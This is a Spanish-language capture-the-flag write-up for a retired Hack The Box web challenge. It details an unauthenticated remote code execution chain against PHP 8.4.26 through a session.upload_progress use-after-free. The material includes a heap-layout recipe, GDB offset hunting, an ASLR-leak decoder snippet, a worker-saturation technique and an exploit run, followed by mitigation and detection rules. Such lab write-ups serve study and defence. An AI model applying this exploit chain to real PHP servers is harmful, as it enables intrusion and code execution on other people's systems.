---
challenge: Dark Embargo
category: Challenge
type: Web
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
solved: 2026-11-08
tags: [web, php, memory-corruption, aslr, cve]
---


# Dark Embargo — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> El reto no tiene flag de usuario ni de root: la única prueba es leer `/flag.txt`.
> Logro: https://labs.hackthebox.com/achievement/challenge/4187928/1926

## TL;DR

Contenedor `php:8.4.26-apache` con una landing estática. La única pista es `X-Powered-By: PHP/8.4.26`, la última versión que arrastra el fallo de `session.upload_progress` (CVE-2026-109618 / CVE-2026-109619). Un multipart que cruza `memory_limit` provoca un *bailout* por OOM que se salta el *teardown* y deja colgando los punteros de sesión. Con uno se filtra memoria por `Set-Cookie` y se rompe ASLR; con el otro se forja un `zend_array` cuyo `pDestructor` es `zif_system`. Resultado: RCE sin autenticar como `www-data` y `/flag.txt` a la vista.

## Enunciado y superficie

- Reto web, dificultad Medium. Se entrega la build completa en un zip: `Dockerfile`, `index.php`, `flag.txt` y `build_docker.sh`.
- El `Dockerfile` es una imagen oficial sin `php.ini` propio: `FROM php:8.4.26-apache`, copia `index.php` y deja `flag.txt` en `/flag.txt` con `chmod 0777`.
- `index.php` no tiene ni una etiqueta `<?php`: es un señuelo. No hay formularios, parámetros ni endpoints dinámicos.

Eso deja el ataque donde menos se mira: la versión de PHP y sus valores por defecto.

## Reconocimiento

```bash
curl -s -I http://<IP>:<PUERTO>/
```

```text
HTTP/1.1 200 OK
Server: Apache/2.4.69 (Debian)
X-Powered-By: PHP/8.4.26
Content-Type: text/html; charset=UTF-8
```

Comprobar los defaults que importan, dentro del contenedor:

```bash
docker exec dark_embargo php -i | grep -Ei 'memory_limit|upload_progress.enabled|session.save_path|post_max_size'
```

```text
memory_limit => 128M => 128M
session.save_path => no value => no value
session.upload_progress.enabled => On => On
post_max_size => 8M => 8M
```

Cuatro valores por defecto sostienen todo el exploit:

- `memory_limit = 128M` da el umbral que hay que cruzar.
- `session.upload_progress.enabled = On` abre el código pre-script.
- `session.save_path` vacío cae a `/tmp`, escribible.
- `display_errors = Off` significa que nada de esto se ve en la respuesta: el único canal de salida es una cabecera.

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

La feature existe para barras de progreso: mandas un campo `PHP_SESSION_UPLOAD_PROGRESS` en un multipart y PHP va apuntando cuántos bytes lleva. Lo importante es **dónde** ocurre: dentro del parser de multipart (`main/rfc1867.c`), antes de ejecutar ningún script. Por eso funciona en una página sin PHP.

Se puede ver en crudo con una subida lenta, porque `session.upload_progress.cleanup` borra el registro en cuanto la subida termina:

```bash
head -c 5M /dev/zero > /tmp/big
curl -s -b 'PHPSESSID=demo' -F 'PHP_SESSION_UPLOAD_PROGRESS=x' \
     -F 'file=@/tmp/big' --limit-rate 80k http://<IP>:<PUERTO>/index.php &
sleep 2
docker exec dark_embargo cat /tmp/sess_demo
```

```text
upload_progress_x|a:5:{s:10:"start_time";i:...;s:14:"content_length";i:5243210;
s:15:"bytes_processed";i:164085;s:4:"done";b:0;...}
```

`done";b:0` confirma que se ha pillado a mitad. Es un camino pre-auth que reserva y libera objetos de heap con datos que controlamos: materia prima para un use-after-free.

`memory_limit` no es un `malloc` que devuelve `NULL`. Cuando ZendMM no puede satisfacer una asignación llama a `zend_mm_safe_error`, que termina en `zend_bailout`: un `longjmp` a la parte alta del request handler.

Ese salto se come el *teardown*. El módulo de sesión no limpia sus globales y ZendMM solo reinicia su contabilidad, así que los dos punteros que tenía —el id de sesión y `$_SESSION`— quedan apuntando a memoria ya liberada. Apache en prefork mantiene vivos a los hijos, así que el estado roto persiste en ese worker.

En el código, los dos campos viven en `ps_globals`: `id` en `+0x10` y `http_session_vars` en `+0x168`. Con GDB se comprueba que, tras el aborto, ambos apuntan al mismo chunk de 2 MB:

```text
id.value                 = 0x7f0c810640c0   → chunk + 0x640c0
http_session_vars.value  = 0x7f0c8107a720   → chunk + 0x7a720
```

Dos offsets estables para este build. El resto del trabajo es convencer al allocator de que devuelva ese chunk, clase de tamaño a clase de tamaño, para que nuestros bytes falsos caigan donde esos punteros leen.

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

- Ver las secciones adyacentes para el detalle.

## Evidencia

- `id` → `uid=33(www-data) gid=33(www-data)`.
- `cat /flag.txt` → `HTB{...}` (redactada).
- `Set-Cookie` de ~600 KB con punteros legibles en el leak.

## Lecciones aprendidas

- **El script no compilaba.** El docstring de cabecera no tenía `"""` de cierre, así que Python se comía el fichero hasta el docstring de `rotate()` y moría con `SyntaxError: invalid decimal literal` en la línea 168. Se cerró el docstring y se añadieron ahí las tres constantes del build, que es donde se buscan cuando hay que reajustarlas. `python -m py_compile` y `--help` ya pasan.
- Perder media hora con el leak por asumir un prefijo alto fijo. El chunk puede caer en cualquier punto de `0x7f...` bajo: hay que enmascarar y contar, no adivinar.
- `LEN`/`len` mentirosos: en el leak el campo `len` falso es justo el bug, así que conviene tener claro qué lee cada función (`php_url_encode` recorre bytes, no confía en el terminador).
- El OOM no es un crash: es un `longjmp`. Entender eso explica por qué el worker sigue vivo y por qué el estado sucio sobrevive entre requests.

## Mitigaciones y detección

- Actualizar a una versión de PHP con el handler corregido (8.4.27 o posterior en la rama 8.4).
- Si no se usan barras de progreso, `session.upload_progress.enabled = Off`; es la mitigación de una línea y no rompe nada en la mayoría de aplicaciones.
- `memory_limit` realista por pool y `MaxRequestWorkers` ajustado al tamaño del contenedor: el ataque depende de poder saturar 149 hijos.
- Reglas de detección: cuerpos multipart con cientos de campos anidados `files[...][...]` y `filename=""`, subidas *chunked* de más de 100 MB, cookies `PHPSESSID` de cientos de KB y respuestas con `Set-Cookie` anormalmente largas.
- En logs de Apache, picos de hijos en estado `W` con un único cliente y `Content-Length` ausente.
- MITRE: T1190, T1059.004, T1027.

## Referencias

- CVE-2026-109618 y CVE-2026-109619 (PHP 8.4, `session.upload_progress`).
- Código de PHP: `main/rfc1867.c`, `ext/session/php_session.h`, `Zend/zend_alloc.c`.
- MITRE ATT&CK: T1190, T1059.004.

## Entorno de depuración y offsets

Nada de esto se ve desde fuera, así que se levanta una segunda copia de la misma imagen con GDB dentro. Hacen falta dos cosas: `CAP_SYS_PTRACE` (Docker lo quita por defecto) y un solo worker para tener un proceso predecible.

```bash
cat > mpm1.conf <<'EOF'
StartServers 1
MinSpareServers 1
MaxSpareServers 1
MaxRequestWorkers 1
ServerLimit 1
MaxConnectionsPerChild 0
EOF

docker run -d --name dark_dbg -p 127.0.0.1:8088:80 \
  --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \
  -v "$PWD/mpm1.conf:/etc/apache2/mods-available/mpm_prefork.conf" dark_embargo

docker exec -it dark_dbg bash
apt-get update -qq && apt-get install -y gdb
```

`libphp.so` no trae debug info, pero conserva la tabla de símbolos:

```bash
gdb -q -batch -iex 'set auto-load safe-path /' \
  -ex 'info address zif_system' \
  -ex 'info address zval_ptr_dtor' \
  -ex 'info address ps_globals' \
  /usr/lib/apache2/modules/libphp.so
```

```text
zif_system     at 0x465370
zval_ptr_dtor  at 0x65eb60
ps_globals     at 0x1316820
```

Son desplazamientos respecto a la base de `libphp.so`. Con eso quedan fijadas las tres constantes del build:

| Nombre | Valor | De dónde sale |
|---|---|---|
| `ZIF_SYSTEM` | `libphp + 0x465370` | `info address` |
| `ZVAL_PTR_DTOR` | `libphp + 0x65EB60` | `info address`, hito del leak |
| `S_OFFSET` | `chunk + 0xF5398` | barrido de `popen`, ver más abajo |

## Leak de ASLR por la cookie de sesión

Sin salida por pantalla hay que hacer que PHP escriba su propia memoria en una cabecera. Al terminar un request, PHP puede mandar `Set-Cookie: PHPSESSID=<id>`, y el id es un `zend_string` que se percent-encodea con `php_url_encode()`. Si el id colgante se reocupa con una cabecera falsa cuyo campo `len` diga ~600 KB, `php_url_encode` lee 600 KB de heap vecino y los mete en la cabecera.

El truco del decoder:

- El valor alineado a 2 MB que más se repite es la base del chunk: dentro de un chunk hay muchos punteros que apuntan a él, y `addr & ~0x1fffff` lo deja limpio.
- Cualquier valor cuyos 12 bits bajos coincidan con la página de `zval_ptr_dtor` es un puntero a esa función; la base es `valor - 0x65EB60`.

```python
def decode_bases(raw):
    heaps = Counter()
    for i in range(len(raw) - 7):
        v = int.from_bytes(raw[i:i+8], "little")
        if PTR_LO <= v < PTR_HI:            # 2^44 .. 2^47
            heaps[v & ~0x1FFFFF] += 1
    heap, hits = heaps.most_common(1)[0]
    ...
    if (v & 0xFFF) == (ZVAL_PTR_DTOR & 0xFFF):
        mods[v - ZVAL_PTR_DTOR] += 1
```

Se exigen al menos 8 coincidencias antes de fiarse de una base. El rango se deja ancho (de `0x1000_0000_0000` a `0x8000_0000_0000`) porque ASLR puede colocar el chunk en cualquier punto del espacio de usuario; asumir un prefijo alto fijo es la causa típica de un leak inestable.

Antes de esto hay que reiniciar el worker: se le manda una subida *chunked* de ~129 MB para que muera por OOM y su reemplazo arranque con un chunk predecible, y después se planta una sesión limpia con el id conocido.

## Del puntero colgante a `system()`

Con las bases conocidas, se reocupa el `$_SESSION` liberado (`chunk + 0x7a720`) con un spray y se apunta a un `zend_array` falso. Cada valor del spray lleva un `zend_reference` falso cada 32 bytes, apuntando a un `zend_array` de 384 bytes que también va en el spray. Ese array falso tiene:

- `pDestructor` en `+0x30` = `zif_system`;
- un bucket falso en `+0x20` con un `zval` de tipo string;
- un `zend_string` falso en `+0x80` cuyos bytes, en `+0x98`, son el comando.

El `arm` previo es el que cruza el límite: unos 880 campos con nombre anidado tipo `files[R00000][a][a]…` (64 niveles) y `filename=""`. No hay fichero temporal, pero cada `HashTable` intermedio se reserva igualmente, así que el heap pasa de 128 MB con un cuerpo de unos cientos de KB en el cable.

La cadena de destrucción es el exploit entero, de abajo arriba:

```text
popen("id>/tmp/p1")
  ← php_exec ← php_exec_ex
    ← zend_hash_destroy (pDestructor = zif_system)
      ← zend_array_destroy
        ← zend_reference_destroy   (nuestro zend_reference sobre $_SESSION)
```

`S_OFFSET` es el único valor que depende de la geometría del spray. Se obtiene rompiendo en `popen` y barriendo el argumento hasta que salta:

```bash
W=$(pgrep -P $(pgrep -f '[a]pache2 -DFOREGROUND' | head -1) | head -1)
gdb -q -p "$W" -iex 'set auto-load safe-path /'
(gdb) break popen
(gdb) x/s $rdi        # 0x7f0c810f5430: "id>/tmp/p1"
(gdb) printf "S_OFFSET = %#lx\n", ($rdi - 0x98) & 0x1fffff
```

```text
S_OFFSET = 0xf5398
```

## Contra el target real: 149 workers ocupados

El reto usa el pool prefork por defecto, `MaxRequestWorkers 150`. Productor, consumidor, `arm` y `fire` tienen que caer en el **mismo** hijo con el mismo heap, así que se atan 149 hijos con subidas *chunked* que nunca terminan (un chunk de 256 bytes cada 0,3 s) y se deja uno libre para toda la secuencia. El script lo hace con hilos y un `Event` compartido que los suelta al final.

```bash
python3 exploit.py --url http://<IP>:<PUERTO>/ \
  --cmd 'cat /flag.txt>/var/www/html/fx' --fetch /fx
```

```text
[*] saturating the worker pool (149 blockers)
[*] leaking bases
[+] chunk=0x7f97b8e00000 libphp=0x7f97baacf000
[*] arm+fire 1/8 sent
PROOF: HTB{...}
```

El *bailout* no corrompe nada: el hijo sobrevive y el `fire` aterriza en uno o dos intentos. El hueco de comando son 200 bytes, así que cabe un reverse shell de una línea sin staging; en esta caja no hay salida a Internet, de modo que la vía práctica es escribir la flag en el webroot y leerla por HTTP.

Parámetros del script: `--blockers 149`, `--rounds 8`, `--leak-tries 6`, `--no-saturate` para el contenedor de un solo worker, `--proof-file`/`--container` para leer la prueba desde dentro del docker, `--no-verify` para certificados self-signed.
